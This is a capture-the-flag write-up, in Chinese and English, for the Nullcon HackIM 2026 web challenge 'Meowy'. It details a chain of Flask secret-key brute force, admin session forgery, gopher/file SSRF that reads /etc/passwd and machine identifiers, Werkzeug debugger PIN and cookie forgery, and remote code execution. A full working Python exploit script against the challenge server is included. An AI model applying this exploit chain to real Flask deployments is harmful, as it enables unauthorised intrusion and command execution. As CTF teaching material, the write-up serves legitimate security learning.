---
title: "Meowy - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["flask", "ssrf", "web", "session", "werkzeug", "base64", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: web/Meowy"
source:
  name: "CTFtime writeup #40546"
  url: "https://ctftime.org/writeup/40546"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Meowy"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Meowy
- **Author team:** 正规子群.AI
- **CTFtime tags:** flask, ssrf, web, session, werkzeug
- **CTFtime:** <https://ctftime.org/writeup/40546>

---
## 111 Meowy

\- Category: `web`  
\- Value: `299`  
\- Solves: `68`  
\- Solved by me: `True`  
\- Local directory: `web/Meowy`

### 题目描述  
> My friends vibe-coded a cute cat image gallery plattform... but as we know, vibe coding leads to insecure applications... Do you manage to prove it to them by finding a flag somewhere on their web server?  
>  
> Oh, they also showed me some source code, but their cat... meowed over it.  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5004`

### 附件下载地址  
\- `<https://ctf.nullcon.net/files/a97ee1e7106cb8b9dd3ae7295b027156/app.py?token=eyJ1c2VyX2lkIjo1MDYyLCJ0ZWFtX2lkIjoyMzEyLCJmaWxlX2lkIjo4NX0.aYqlQg.QxHFy3OO64draQ3zl8nGbohWD1M>`

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# Meowy Writeup

\---  
## 题目信息

\- Challenge: `Meowy`  
\- Category: Web  
\- 目标 flag 格式: `ENO{...}`  
\- 远端: `52.59.124.14:5004`

\---  
## 最终 Flag

```text  
ENO{w3rkz3ug_p1n_byp4ss_v1a_c00k13_f0rg3ry_l3ads_2_RCE!}  
```

\---  
## 总体思路

核心漏洞链分为四段：

1\. Flask session 使用可爆破的随机词作为 `secret_key`。  
2\. 伪造 `{"is_admin": true}` 后可访问 `/fetch`（管理员 SSRF 功能）。  
3\. `/fetch` 可用 `gopher://` 访问内网 `127.0.0.1:5000` 的 Werkzeug console。  
4\. 计算并伪造 Werkzeug 的 `__wzd...` 信任 cookie，直接执行 `__import__('os').popen('/readflag').read()` 拿 flag。

\---  
## 详细分析

### 1. Session 伪造

`[app.py](http://app.py)` 中 `secret_key` 由 `random_word` 的本地词库生成，且满足长度约束（`>= 12`）。

因此可以做签名校验爆破：

\- 拿到初始 cookie: `session=<payload>.<timestamp>.<sig>`  
\- 对词库单词 $w$ 逐个尝试 `TimestampSigner`，判断 `sig_w == sig`  
\- 命中后得到真实 `secret_key`

数学上就是找到：

$\operatorname{HMAC}_{w}(payload\|timestamp) = sig$

### 2. 管理员 SSRF `/fetch`

伪造 session 为：

```json  
{"is_admin": true}  
```

并保持原 timestamp，重新签名后即可通过 `/fetch` 鉴权。

随后验证到：

\- `file://` 可读本地文件  
\- `gopher://` 可发送原始 TCP 请求  
\- 内网真实监听端口在 `127.0.0.1:5000`（外部是 `5004`）

### 3. 内网调试器信息收集

通过 gopher 请求：

`GET /console HTTP/1.1`

拿到 Werkzeug console HTML，提取到：

\- `SECRET = "..."`  
\- `EVALEX_TRUSTED = false`

同时通过 `file://` 读出 PIN 计算所需位：

\- `/etc/passwd` + `/proc/self/status` 得 username=`ctfplayer`  
\- `/sys/class/net/eth0/address` 得 MAC  
\- `/etc/machine-id` 与 `/proc/self/cgroup` 组合 machine-id  
\- `modname=flask.app`  
\- `modfile=/usr/local/lib/python3.11/site-packages/flask/[app.py](http://app.py)`  
\- `app_name=Flask`（关键）

### 4. Werkzeug PIN/Cookie 伪造并 RCE

按 Werkzeug 逻辑计算：

\- `cookie_name = __wzd + sha1(bits + cookiesalt)[:20]`  
\- `pin = format(sha1(... + pinsalt))`  
\- `pin_hash = sha1(pin + " added salt")[:12]`  
\- 信任 cookie 值：`<unix_ts>|<pin_hash>`

然后构造 gopher 原始请求（带 `Cookie: __wzd...=`）：

`GET /console?__debugger__=yes&cmd=<python_expr>&frm=0&s=<SECRET>`

执行表达式：

```python  
__import__('os').popen('/readflag').read()  
```

返回即为真实 flag。

\---  
## 失败尝试记录

1\. 直接伪造 `is_admin=true` 访问 `/console`：失败。因为 `/console` 还额外要求 `REMOTE_ADDR` 为 loopback。  
2\. 直接 SSRF `http://127.0.0.1:5004`：失败。容器内服务实际监听在 `5000`。  
3\. 直接读 `file:///flag.txt`：失败（无读取权限/不可直接打开）。  
4\. 直接调用 `pinauth`：被题目自定义中间件拦截，固定返回禁用。

这些失败最终指向了正确路径：`gopher` 自定义 header + 本地计算 `__wzd` cookie。

\---  
## 复现步骤

1\. 运行利用脚本：

```bash  
python3 solution/[solution.py](http://solution.py)  
```

2\. 预期输出：

```text  
ENO{w3rkz3ug_p1n_byp4ss_v1a_c00k13_f0rg3ry_l3ads_2_RCE!}  
```

\---  
## 目录说明

\- `task/[app.py](http://app.py)`: 题目源码附件  
\- `task/words.json`: `random_word` 本地词库（用于爆破签名）  
\- `solution/[solution.py](http://solution.py)`: 最终利用脚本（已验证）

### Exploit  
#### web/Meowy/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import base64  
import hashlib  
import html  
import json  
import re  
import sys  
import time  
import urllib.parse  
from pathlib import Path

import requests  
from itsdangerous import TimestampSigner

BASE_URL = "http://52.59.124.14:5004"  
TARGET_LOOPBACK_HOST = "127.0.0.1"  
TARGET_LOOPBACK_PORT = 5000  
HTTP_RETRY = 6  
HTTP_SLEEP = 0.35

def load_words() -> list[str]:  
candidates = [  
Path(__file__).resolve().parent / "words.json",  
Path(__file__).resolve().parents[1] / "task" / "words.json",  
Path(__file__).resolve().parents[1] / "wheel" / "random_word" / "database" / "words.json",  
]  
for p in candidates:  
if p.exists():  
data = json.loads(p.read_text(encoding="utf-8"))  
return [w for w in data.keys() if len(w) >= 12]  
raise FileNotFoundError("words.json not found (expected in solution/ or task/)")

def extract_session_cookie(set_cookie: str) -> str:  
m = re.search(r"session=([^;]+)", set_cookie)  
if not m:  
raise ValueError("session cookie not found")  
return m.group(1)

def crack_secret(cookie: str, words: list[str]) -> tuple[str, str]:  
payload_b64, ts, sig = cookie.split(".")  
msg = f"{payload_b64}.{ts}".encode()  
for w in words:  
signer = TimestampSigner(  
secret_key=w,  
salt="cookie-session",  
key_derivation="hmac",  
digest_method=hashlib.sha1,  
)  
if signer.get_signature(msg) == sig.encode():  
return w, ts  
raise RuntimeError("failed to crack Flask secret_key")

def forge_admin_cookie(secret_key: str, ts: str) -> str:  
payload = base64.urlsafe_b64encode(b'{"is_admin":true}').decode().rstrip("=")  
signer = TimestampSigner(  
secret_key=secret_key,  
salt="cookie-session",  
key_derivation="hmac",  
digest_method=hashlib.sha1,  
)  
sig = signer.get_signature(f"{payload}.{ts}".encode()).decode()  
return f"{payload}.{ts}.{sig}"

def extract_pre(html_text: str) -> str:  
matches = re.findall(r"

```
    (.*?)
```

", html_text, flags=re.S | re.I)  
if matches:  
return html.unescape(max(matches, key=len))  
return html_text 

def request_with_retry(  
method: str,  
url: str,  
*,  
timeout: int = 15,  
**kwargs,  
) -> requests.Response:  
last_err: Exception | None = None  
for _ in range(HTTP_RETRY):  
try:  
return requests.request(method, url, timeout=timeout, **kwargs)  
except requests.RequestException as e:  
last_err = e  
time.sleep(HTTP_SLEEP)  
assert last_err is not None  
raise last_err

def fetch_via_ssrf(admin_cookie: str, url: str, timeout: int = 20) -> str:  
r = request_with_retry(  
"GET",  
f"{BASE_URL}/fetch",  
params={"url": url},  
headers={"Cookie": f"session={admin_cookie}"},  
timeout=timeout,  
)  
r.raise_for_status()  
return extract_pre(r.text)

def gopher_get(path_with_query: str, headers: dict[str, str] | None = None) -> str:  
req = [  
f"GET {path_with_query} HTTP/1.1",  
f"Host: {TARGET_LOOPBACK_HOST}:{TARGET_LOOPBACK_PORT}",  
]  
if headers:  
for k, v in headers.items():  
req.append(f"{k}: {v}")  
req.append("Connection: close")  
req.append("")  
req.append("")  
raw = "\r\n".join(req)  
return f"gopher://{TARGET_LOOPBACK_HOST}:{TARGET_LOOPBACK_PORT}/_" + urllib.parse.quote(raw, safe="")

def calc_pin_and_cookie_name(username: str, app_name: str, mac_int: str, machine_id: str) -> tuple[str, str]:  
modname = "flask.app"  
modfile = "/usr/local/lib/python3.11/site-packages/flask/[app.py](http://app.py)"

h = hashlib.sha1()  
for bit in [username, modname, app_name, modfile, mac_int, machine_id]:  
h.update(bit.encode())  
h.update(b"cookiesalt")  
cookie_name = "__wzd" + h.hexdigest()[:20]

h.update(b"pinsalt")  
num = f"{int(h.hexdigest(), 16):09d}"[:9]  
pin = f"{num[:3]}-{num[3:6]}-{num[6:9]}"  
return pin, cookie_name

def parse_http_body(raw_http: str) -> str:  
if "\r\n\r\n" in raw_http:  
return raw_http.split("\r\n\r\n", 1)[1]  
if "\n\n" in raw_http:  
return raw_http.split("\n\n", 1)[1]  
return raw_http

def main() -> int:  
words = load_words()

# Step 1: get regular session and crack secret key.  
r = request_with_retry("GET", f"{BASE_URL}/", timeout=10)  
raw_cookie = extract_session_cookie(r.headers.get("Set-Cookie", ""))  
secret_key, ts = crack_secret(raw_cookie, words)

# Step 2: forge admin session for /fetch SSRF.  
admin_cookie = forge_admin_cookie(secret_key, ts)

# Step 3: reach internal debugger console and extract SECRET token.  
console_raw = fetch_via_ssrf(admin_cookie, gopher_get("/console"))  
m = re.search(r'SECRET\s*=\s*"([^"]+)"', console_raw)  
if not m:  
raise RuntimeError("failed to extract debugger SECRET")  
debugger_secret = m.group(1)

# Step 4: collect bits needed for Werkzeug pin cookie forgery.  
passwd = fetch_via_ssrf(admin_cookie, "file:///etc/passwd")  
status = fetch_via_ssrf(admin_cookie, "file:///proc/self/status")  
machine_id = fetch_via_ssrf(admin_cookie, "file:///etc/machine-id").strip()  
cgroup = fetch_via_ssrf(admin_cookie, "file:///proc/self/cgroup").splitlines()[0].strip()  
mac = fetch_via_ssrf(admin_cookie, "file:///sys/class/net/eth0/address").strip()

uid_match = re.search(r"^Uid:\s*(\d+)", status, flags=re.M)  
if not uid_match:  
raise RuntimeError("failed to parse UID from /proc/self/status")  
uid = uid_match.group(1)

username = None  
for line in passwd.splitlines():  
parts = line.split(":")  
if len(parts) >= 4 and parts[2] == uid:  
username = parts[0]  
break  
if not username:  
raise RuntimeError("failed to map UID to username")

machine_id = machine_id + cgroup.rpartition("/")[2]  
mac_int = str(int(mac.replace(":", ""), 16))

# Step 5: forge trusted debugger cookie and execute /readflag.  
cmd = "__import__('os').popen('/readflag').read()"  
enc_cmd = urllib.parse.quote(cmd, safe="")

app_name_candidates = ["Flask", "app", "__main__", "wsgi_app"]  
for app_name in app_name_candidates:  
pin, pin_cookie_name = calc_pin_and_cookie_name(username, app_name, mac_int, machine_id)  
pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]  
trusted_cookie_value = f"{int(time.time())}|{pin_hash}"

path = f"/console?__debugger__=yes&cmd={enc_cmd}&frm=0&s={debugger_secret}"  
raw = fetch_via_ssrf(  
admin_cookie,  
gopher_get(path, headers={"Cookie": f"{pin_cookie_name}={trusted_cookie_value}"}),  
)  
body = html.unescape(parse_http_body(raw))  
flag_match = re.search(r"ENO\\{[^}]+\\}", body)  
if flag_match:  
print(flag_match.group(0))  
return 0

raise RuntimeError("flag not found; pin/cookie candidate set may be incomplete")

if __name__ == "__main__":  
try:  
raise SystemExit(main())  
except Exception as e:  
print(f"[!] {e}", file=sys.stderr)  
raise  
```

\---
